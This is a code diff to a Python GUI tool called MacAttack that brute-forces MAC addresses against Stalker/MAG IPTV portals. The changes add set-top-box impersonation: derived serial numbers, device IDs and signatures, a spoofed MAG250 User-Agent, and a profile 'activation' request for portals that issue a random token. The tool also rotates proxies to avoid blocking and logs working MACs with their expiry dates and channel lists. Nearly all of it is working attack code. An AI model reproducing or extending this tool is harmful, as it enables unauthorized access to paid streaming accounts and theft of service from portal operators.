@@ -1,5 +1,5 @@
 # todo
-# use actual input for request, stripping the /c/ so portals in subdir worker
+# update stalker portal autodetect
 
 VERSION = "4.5.2"
 import semver
@@ -107,12 +107,14 @@ def get_token(session, url, mac_address, timeout=30):
         device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
         device_id2 = hashlib.sha256(mac_address.encode()).hexdigest().upper()
         hw_version_2 = hashlib.sha1(mac_address.encode()).hexdigest()
+        signature_string = f'{sn}{mac_address}'
+        signature = hashlib.sha256(signature_string.encode()).hexdigest().upper()
         cookies = {
             "adid": hw_version_2,
             "debug": "1",
             "device_id2": device_id2,
             "device_id": device_id,
-            "hw_version": "1.7-B",
+            "hw_version": "1.7-BD-00",
             "mac": mac_address,
             "sn": sn,
             "stb_lang": "en",
@@ -133,6 +135,54 @@ def get_token(session, url, mac_address, timeout=30):
         response.raise_for_status()
         token = response.json().get("js", {}).get("token")
         if token:
+            
+            token_random = response.json().get("js", {}).get("random")  # Extract 'random' if present
+
+            
+            if token_random:
+                print("RANDOM FOUND")
+
+                # Get profile first to activate portals that use a "random"
+                metrics = {'mac': mac_address, 'sn': sn, 'type': 'STB', 'model': 'MAG250', 'uid': device_id, 'random': token_random} 
+
+                session.headers.update(
+                    {
+                        'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
+                        'Accept-Encoding': 'gzip, deflate, zstd',
+                        'Accept': '*/*',
+                        'Connection': 'close',
+                        'Cache-Control': 'no-cache',
+                        'Authorization': f'Bearer {token}',  # token to headers
+                        'X-Random': '{token_random}',
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    }
+                )
+
+                session.cookies.update(
+                    {
+                        'adid': hw_version_2,
+                        'debug': '1',
+                        'device_id2': device_id2,
+                        'device_id': device_id,
+                        'hw_version': '1.7-BD-00',
+                        'mac': mac_address,
+                        'sn': sn,
+                        'stb_lang': 'en',
+                        'timezone': 'America/Los_Angeles',
+                    }
+                )
+                
+                
+                url1_a = f"{url}/{portaltype}?type=stb&action=get_profile&hd=1&ver=ImageDescription: 0.2.18-r23-250; ImageDate: Wed Aug 29 10:49:53 EEST 2018; PORTAL version: 5.6.1; API Version: JS API version: 343; STB API version: 146; Player Engine version: 0x58c&num_banks=2&sn={sn}&stb_type=MAG250&client_type=STB&image_version=218&video_out=hdmi&device_id={device_id2}&device_id2={device_id2}&signature={signature}&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&metrics={metrics}&hw_version_2={hw_version_2}&timestamp=1735503369&api_signature=262&prehash=0"
+                # Activate the portal by getting the profile with the correct headers cookies and id's
+                res1_a = session.get(url1_a)            
+            
+            
+            
+            
+            
+            
+            
             logging.info(f"Token retrieved: {token}")
             return token
         else:
@@ -430,7 +480,7 @@ class RequestThread(QThread):
                 "debug": "1",
                 "device_id2": device_id2,
                 "device_id": device_id,
-                "hw_version": "1.7-B",
+                "hw_version": "1.7-BD-00",
                 "mac": mac_address,
                 "sn": sn,
                 "stb_lang": "en",
@@ -1486,55 +1536,15 @@ class MacAttack(QMainWindow):
         # Add "Get Proxies" and "Test Proxies" buttons to the layout
         generate_proxy_layout.addWidget(self.generate_button)
         generate_proxy_layout.addWidget(self.test_proxies_button)  # Add the new button
-        generate_proxy_layout.addSpacing(
-            15
-        )  # 15px spacing between the buttons and slider
-
-        # Speed input (Slider)
-        self.proxy_speed_label = QLabel("Speed:")
-        self.proxy_concurrent_tests = QSlider(
-            Qt.Horizontal
-        )  # Changed from QSpinBox to QSlider
-        self.proxy_concurrent_tests.setRange(1, 100)  # Range from 1 to 100
-        self.proxy_concurrent_tests.setValue(100)  # Default value of 100
-        self.proxy_concurrent_tests.setTickPosition(
-            QSlider.TicksBelow
-        )  # Show ticks below the slider
-        self.proxy_concurrent_tests.setTickInterval(
-            50
-        )  # Interval between tick marks for better granularity
-
-        # Dynamic label to show the current value of the slider
-        self.proxy_speed_value_label = QLabel(str(self.proxy_concurrent_tests.value()))
-        self.proxy_concurrent_tests.valueChanged.connect(
-            self.update_proxy_fetching_speed
-        )
-
-        # Add the slider and related components to the layout
-        generate_proxy_layout.addWidget(self.proxy_speed_label)
-        generate_proxy_layout.addWidget(self.proxy_concurrent_tests)
-        generate_proxy_layout.addWidget(
-            self.proxy_speed_value_label
-        )  # Label showing the slider's value
 
         # Checkbox for "Update Hourly"
-        self.update_hourly_checkbox = QCheckBox("Update Hourly")
+        self.update_hourly_checkbox = QCheckBox("Get Proxies Hourly")
         self.update_hourly_checkbox.setSizePolicy(QSizePolicy.Fixed, QSizePolicy.Fixed)
         self.update_hourly_checkbox.stateChanged.connect(self.proxy_auto_updater)
-
-        # Label to show the countdown timer
-        self.update_timer_label = QLabel("")
-        self.update_timer_label.setSizePolicy(QSizePolicy.Fixed, QSizePolicy.Fixed)
-
-        # Add a 25px spacer before the "Update Hourly" checkbox
-        spacer_before_checkbox = QSpacerItem(
-            25, 0, QSizePolicy.Fixed, QSizePolicy.Minimum
-        )
-        generate_proxy_layout.addItem(spacer_before_checkbox)
-
-        # Add the checkbox and label to the layout
+        # Remove top and bottom spacing and padding using a stylesheet
+        self.update_hourly_checkbox.setStyleSheet("QCheckBox { margin: 0px; padding: 3px; }")
+        # Add the checkbox to the layout
         generate_proxy_layout.addWidget(self.update_hourly_checkbox)
-        generate_proxy_layout.addWidget(self.update_timer_label)
 
         # Spacer to push the proxy count label to the right
         generate_proxy_layout.addStretch(
@@ -1606,7 +1616,7 @@ class MacAttack(QMainWindow):
         if self.hourly_timer:
             self.hourly_timer.stop()  # Stop the timer
             self.hourly_timer = None  # Clear the timer reference
-        self.update_timer_label.setText("")  # Reset label text
+        self.update_hourly_checkbox.setText(f"Get Proxies Hourly")
         logging.info("Stopped hourly update timer.")
 
     # Update the countdown timer and execute get_proxies when it reaches 0
@@ -1615,7 +1625,8 @@ class MacAttack(QMainWindow):
             self.remaining_time -= 1
             minutes = self.remaining_time // 60
             seconds = self.remaining_time % 60
-            self.update_timer_label.setText(f"{minutes:02}:{seconds:02}")
+            #self.update_timer_label.setText(f"{minutes:02}:{seconds:02}")
+            self.update_hourly_checkbox.setText(f"Get Proxies Hourly {minutes:02}:{seconds:02}")
         else:
             self.hourly_timer.stop()  # Stop the timer
             self.hourly_timer = None  # Clear the timer reference
@@ -1678,7 +1689,7 @@ class MacAttack(QMainWindow):
             value * 3
         )  # Increase testing speed proportionally
         self.proxy_output.append(f"Proxy fetching speed set at: {value}")
-        self.proxy_speed_value_label.setText(str(self.proxy_concurrent_tests.value()))
+        #self.proxy_speed_value_label.setText(str(self.proxy_concurrent_tests.value()))
 
     def get_proxies(self):
         self.proxy_fetcher.start()  # Start the background thread
@@ -2241,7 +2252,7 @@ class MacAttack(QMainWindow):
                 "QCheckBox { background-color: black; color: red; }"
             )
             self.concurrent_tests.setRange(1, 1000)
-            self.proxy_concurrent_tests.setRange(1, 1000)
+            #self.proxy_concurrent_tests.setRange(1, 1000)
         else:
             # Reset text and styling for unchecked state
             self.ludicrous_speed_checkbox.setText("Enable Ludicrous Speed!")
@@ -2249,7 +2260,7 @@ class MacAttack(QMainWindow):
                 "QCheckBox { background-color: #666666; color: white; }"
             )
             self.concurrent_tests.setRange(1, 100)  # Default range
-            self.proxy_concurrent_tests.setRange(1, 100)
+            #self.proxy_concurrent_tests.setRange(1, 100)
 
     def update_mac_label(self, text):
         """Update the MAC address label in the main thread."""
@@ -2553,7 +2564,7 @@ class MacAttack(QMainWindow):
             self.proxy_location_output_checkbox.setChecked(False)
             self.singleoutputfile_checkbox.setChecked(True)
             self.proxy_location_output_checkbox.setChecked(False)
-            self.proxy_concurrent_tests.setValue(100)
+            #self.proxy_concurrent_tests.setValue(100)
             self.proxy_remove_errorcount.setValue(5)
             self.proxy_input.setText("")
             self.output_buffer_spinbox.setValue(2500)
@@ -2598,7 +2609,7 @@ class MacAttack(QMainWindow):
             "active_tab": str(self.tabs.currentIndex()),
             "proxy_enabled": str(self.proxy_enabled_checkbox.isChecked()),
             "proxy_list": self.proxy_textbox.toPlainText(),
-            "proxy_concurrent_tests": str(self.proxy_concurrent_tests.value()),
+            #"proxy_concurrent_tests": str(self.proxy_concurrent_tests.value()),
             "proxy_remove_errorcount": str(self.proxy_remove_errorcount.value()),
             "ludicrous_speed": str(self.ludicrous_speed_checkbox.isChecked()),
             "deviceid_output": str(self.deviceid_output_checkbox.isChecked()),
@@ -2727,9 +2738,9 @@ class MacAttack(QMainWindow):
             self.proxy_textbox.setPlainText(
                 config.get("Settings", "proxy_list", fallback="")
             )
-            self.proxy_concurrent_tests.setValue(
-                config.getint("Settings", "proxy_concurrent_tests", fallback=100)
-            )
+            #self.proxy_concurrent_tests.setValue(
+            #    config.getint("Settings", "proxy_concurrent_tests", fallback=100)
+            #)
             self.proxy_remove_errorcount.setValue(
                 config.getint("Settings", "proxy_remove_errorcount", fallback=5)
             )
@@ -2815,22 +2826,41 @@ class MacAttack(QMainWindow):
         creation_thread.start()
 
     def _create_threads(self):
+        global portaltype
         # Get and parse the IPTV link
         self.iptv_link = self.iptv_link_entry.text()
         self.parsed_url = urlparse(self.iptv_link)
+        print("1")
+        self.parsed_path = self.parsed_url.path
+        print (self.parsed_path)
+        #remove the c/ from the path
+        print("2")
+        if self.parsed_path.endswith("c"):
+            self.parsed_path = self.parsed_path[:-1]
+        if self.parsed_path.endswith("c/"):
+            self.parsed_path = self.parsed_path[:-2]
+        print("3")
+        print (self.parsed_path)
         self.host = self.parsed_url.hostname
         self.port = self.parsed_url.port or 80
-        self.base_url = f"http://{self.host}:{self.port}"
+        self.base_url = f"http://{self.host}:{self.port}{self.parsed_path}"
+        # if both url and method contain "stalker_portal/" then remove it from the url
+        if "stalker_portal/" in self.base_url and "stalker_portal/" in portaltype:
+            self.base_url = self.base_url.replace("stalker_portal/", "")
+        print(self.base_url)
+        print(portaltype)
+
+
         # Calculate the number of threads to start
         num_tests = self.concurrent_tests.value()
         if self.proxy_enabled_checkbox.isChecked() and num_tests > 1:
-            max_value = 500
+            max_value = 400
             if max_value < 15:
                 max_value = 15
             num_tests = 1 + (num_tests - 1) * (max_value - 1) / (100 - 1)
             num_tests = int(num_tests)
             if self.ludicrous_speed_checkbox.isChecked() and num_tests > 1:
-                max_value = 5000
+                max_value = 4000
                 if max_value < 15:
                     max_value = 15
                 num_tests = 1 + (num_tests - 1) * (max_value - 1) / (1800 - 1)
@@ -2890,9 +2920,9 @@ class MacAttack(QMainWindow):
             logging.error("MAC count label is not initialized.")
 
     def BigMacAttack(self):
+        # BigMacAttack: Two all-beef patties, special sauce, lettuce, cheese, pickles, onions, on a sesame seed bun.
         global mac_count
         global portaltype
-        # BigMacAttack: Two all-beef patties, special sauce, lettuce, cheese, pickles, onions, on a sesame seed bun.
         timeout = 60
         proxies = {}
         hostname = None
@@ -2959,8 +2989,11 @@ class MacAttack(QMainWindow):
             serialnumber = hashlib.md5(mac.encode()).hexdigest().upper()
             sn = serialnumber[0:13]
             device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
+            device_id = hashlib.sha256(mac.encode('utf-8')).hexdigest().upper()
             device_id2 = hashlib.sha256(mac.encode()).hexdigest().upper()
             hw_version_2 = hashlib.sha1(mac.encode()).hexdigest()
+            signature_string = f'{sn}{mac}'
+            signature = hashlib.sha256(signature_string.encode()).hexdigest().upper()
             if not proxies:
                 self.update_mac_label_signal.emit(f"Testing MAC: {mac}")
             if proxies:
@@ -2978,7 +3011,7 @@ class MacAttack(QMainWindow):
                             "debug": "1",
                             "device_id2": device_id2,
                             "device_id": device_id,
-                            "hw_version": "1.7-B",
+                            "hw_version": "1.7-BD-00",
                             "mac": mac,
                             "sn": sn,
                             "stb_lang": "en",
@@ -2993,8 +3026,10 @@ class MacAttack(QMainWindow):
                             "Cache-Control": "no-cache",
                         }
                     )
-                    # random_number = random.randint(100000, 999999)
+
                     url = f"{self.base_url}/{portaltype}?action=handshake&type=stb&JsHttpRequest=1-xml"
+
+                    
                     logging.info(f"{url}")
                     
                     # If proxy is enabled, the proxy to the session
@@ -3024,36 +3059,69 @@ class MacAttack(QMainWindow):
 
                     logging.info(
                         f"Response Text: {res.text}"
-                    )  # For HTML content or text
+                    )
                     logging.debug(f"Response Headers: {res.headers}")
                     if res.text:
                         data = json.loads(res.text)
                         token = data.get("js", {}).get("token")
-                        logging.info(
-                            f"TOKEN: {token} MAC: {mac} BASEURL: {self.base_url}"
-                        )
-                        url2 = f"{self.base_url}/{portaltype}?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
+                        token_random = data.get("js", {}).get("random")  # Extract 'random' if present
 
-                        macattacksess.cookies.update(
-                            {
-                                "token": token,  # token to cookies,
-                            }
+                        # Log details
+                        logging.info(
+                            f"TOKEN: {token} "
+                            f"RANDOM: {token_random if token_random else 'N/A'} "
+                            f"MAC: {mac} "
+                            f"BASEURL: {self.base_url}"
                         )
-                        macattacksess.headers.update(
-                            {
-                                "Authorization": f"Bearer {token}",  # token to headers
-                            }
-                        )
+                        
+                        if token_random:
+                            print("RANDOM FOUND")
+
+                            # Get profile first to activate portals that use a "random"
+                            metrics = {'mac': mac, 'sn': sn, 'type': 'STB', 'model': 'MAG250', 'uid': device_id, 'random': token_random} 
+
+                            macattacksess.headers.update(
+                                {
+                                    'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
+                                    'Accept-Encoding': 'gzip, deflate, zstd',
+                                    'Accept': '*/*',
+                                    'Connection': 'close',
+                                    'Cache-Control': 'no-cache',
+                                    'Authorization': f'Bearer {token}',  # token to headers
+                                    'X-Random': '{token_random}',
+                                    'Content-Type': 'application/x-www-form-urlencoded',
+                                }
+                            )
+
+                            macattacksess.cookies.update(
+                                {
+                                    'adid': hw_version_2,
+                                    'debug': '1',
+                                    'device_id2': device_id2,
+                                    'device_id': device_id,
+                                    'hw_version': '1.7-BD-00',
+                                    'mac': mac,
+                                    'sn': sn,
+                                    'stb_lang': 'en',
+                                    'timezone': 'America/Los_Angeles',
+                                }
+                            )
+                            
+                            
+                            url1_a = f"{self.base_url}/{portaltype}?type=stb&action=get_profile&hd=1&ver=ImageDescription: 0.2.18-r23-250; ImageDate: Wed Aug 29 10:49:53 EEST 2018; PORTAL version: 5.6.1; API Version: JS API version: 343; STB API version: 146; Player Engine version: 0x58c&num_banks=2&sn={sn}&stb_type=MAG250&client_type=STB&image_version=218&video_out=hdmi&device_id={device_id2}&device_id2={device_id2}&signature={signature}&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&metrics={metrics}&hw_version_2={hw_version_2}&timestamp=1735503369&api_signature=262&prehash=0"
+                            # Activate the portal by getting the profile with the correct headers cookies and id's
+                            res1_a = macattacksess.get(url1_a)
+     
+                        
+                        url2 = f"{self.base_url}/{portaltype}?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
 
                         res2 = macattacksess.get(
                             url2, timeout=timeout, allow_redirects=False
                         )
 
-                        logging.info(f"2Status Code: {res2.status_code}")
-                        logging.info(
-                            f"2Response Text: {res2.text}"
-                        )  # For HTML content or text
-                        logging.info(f"2Response Headers: {res2.headers}")
+                        #logging.info(f"2Status Code: {res2.status_code}")
+                        print(f"2Response Text: {res2.text}")
+                        #logging.info(f"2Response Headers: {res2.headers}")
 
                         if res2.text:
                             data = json.loads(res2.text)
@@ -3064,6 +3132,17 @@ class MacAttack(QMainWindow):
                             ):
                                 mac = data["js"]["mac"]
                                 expiry = data["js"]["phone"]
+                                
+                                try:
+                                    # Try to convert the string to an integer (it could be a Unix timestamp)
+                                    timestamp = int(expiry)
+                                    expiry = datetime.utcfromtimestamp(timestamp).strftime('%B %d, %Y, %I:%M %p')
+                                except ValueError:
+                                    # If it fails, it likely is already in a human-readable format
+                                    pass
+
+                                print(expiry)  # This will print the human-readable date                                
+                                
                                 url3 = f"{self.base_url}/{portaltype}?type=itv&action=get_all_channels&JsHttpRequest=1-xml"
                                 res3 = macattacksess.get(
                                     url3,
@@ -3248,7 +3327,7 @@ class MacAttack(QMainWindow):
                                     logging.info("Mac found")
 
                                     if self.autoloadmac_checkbox.isChecked():
-                                        self.hostname_input.setText(self.base_url)
+                                        self.hostname_input.setText(self.iptv_link)
                                         self.mac_input.setText(mac)
                                     if self.output_file is None:
                                         output_filename = self.OutputMastermind()
@@ -3551,6 +3630,7 @@ class MacAttack(QMainWindow):
                         or "queue was full" in res.text
                         or "logoSophosFooter" in res.text
                         or "connection_error" in res.text
+                        or "ERR_CONNECT_FAIL" in res.text
                         or "The server is not responding" in res.text
                     ):
                         # Track error count for the proxy
@@ -4372,7 +4452,7 @@ class MacAttack(QMainWindow):
                 "debug": "1",
                 "device_id2": device_id2,
                 "device_id": device_id,
-                "hw_version": "1.7-B",
+                "hw_version": "1.7-BD-00",
                 "mac": mac_address,
                 "sn": sn,
                 "stb_lang": "en",
@@ -4564,7 +4644,7 @@ class MacAttack(QMainWindow):
 
         if item_type == "channel":
             needs_create_link = False
-            if "/ch/" in cmd and cmd.endswith("_"):
+            if "/ch/" in cmd and cmd.endswith("_") or "ffrt" in cmd:
                 needs_create_link = True
 
             if needs_create_link:
@@ -4600,7 +4680,7 @@ class MacAttack(QMainWindow):
                         "debug": "1",
                         "device_id2": device_id2,
                         "device_id": device_id,
-                        "hw_version": "1.7-B",
+                        "hw_version": "1.7-BD-00",
                         "mac": mac_address,
                         "sn": sn,
                         "stb_lang": "en",
@@ -4675,7 +4755,7 @@ class MacAttack(QMainWindow):
                     "debug": "1",
                     "device_id2": device_id2,
                     "device_id": device_id,
-                    "hw_version": "1.7-B",
+                    "hw_version": "1.7-BD-00",
                     "mac": mac_address,
                     "sn": sn,
                     "stb_lang": "en",
